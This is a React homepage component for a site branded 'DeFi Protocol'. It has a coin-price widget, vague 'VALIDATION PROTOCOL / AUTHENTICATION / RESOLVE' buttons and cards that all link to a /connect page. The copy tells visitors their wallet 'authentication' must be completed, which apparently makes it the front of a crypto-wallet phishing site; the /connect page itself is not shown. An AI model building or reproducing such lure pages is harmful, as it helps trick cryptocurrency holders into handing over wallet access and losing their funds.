import React from "react";

import { Link } from "react-router-dom";

import LogoUse from "../img/shared/logoo.png";

import { HomeData } from "../homedata.js";

import Hammar from "../../src/img/lastb.png";

const HomePage = () => {
  return (
    <>
      <div className="Home__header">
        <iframe
          title="coin stats"
          src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover="
          scrolling="auto"
          marginwidth="0"
          marginheight="0"
          border="0"
          style={{ border: "0", margin: "0", padding: "0" }}
          width="100%"
          height="36px"
          frameborder="0"
        ></iframe>
        <div className="dicline">
          <div className="liner"></div>
          <div className="mis">
            <div className="Home__logo">
              <img className="logooo" src={LogoUse} alt="logo" />
            </div>
            <div className="Home__hero">
              <div className="Home__hero__con">
                <h2 style={{ fontSize: "2rem", fontWeight: 600 }}>
                  VALIDATION PROTOCOL
                </h2>

                <h3 style={{ fontWeight: 400 }}>AUTHENTICATION</h3>
                <Link className="HlinkH" to="/connect">
                  <button className="btn__Home">RESOLVE</button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>

      <br />
      <br />

      <div className="next">
        <div className="next__guide">
          <p
            style={{ color: "#051E37", margin: ".5em 0", textAlign: "center" }}
          >
            DeFi Protocol is a decentralized platform and network that blends
            Blockchain with DeFi, incorporating Blockchain aspects such as
            non-custodial management, Micropools, rapid liquidity, and
            decentralized governance. Each procedure must be completed in its
            entirety.
          </p>
          <h4
            style={{ color: "#051E37", margin: ".5em 0", textAlign: "center" }}
          >
            <bold style={{ color: "#051E37" }}>
              The authentication of wallet will be finished as follows
            </bold>
          </h4>
        </div>
      </div>

      <br />
      <br />

      <div className="containnerrr">
        <div className="next__guide flexHome">
          {HomeData.map((data) => {
            return (
              <div className="cardHome" key={data.id}>
                <img className="img__data" src={data.image} alt="icon" />
                <br />
                <h3>{data.description}</h3>
                <br />
                <Link style={{ color: "black" }} to="/connect">
                  <button className="btn_home btn__home__full btn__style">
                    {data.button}
                  </button>
                </Link>
              </div>
            );
          })}
        </div>
      </div>

      <br />
      <br />

      <div className="lastSection">
        <div className="next__guide flexx">
          <img src={Hammar} alt="bannershow" />
          <div className="text__home">
            <h1>Everything You Need</h1>
            <br />
            <p>
              Cryptocurrency wallets provide users with a digital solution for
              securely storing and managing blockchain assets and
              cryptocurrencies. These wallets allow users to spend, receive, and
              trade cryptocurrencies.
            </p>
          </div>
        </div>
      </div>
      <div className="footer">
        <h5>Copyright @2022 Defi Protocol</h5>
      </div>
    </>
  );
};

export default HomePage;
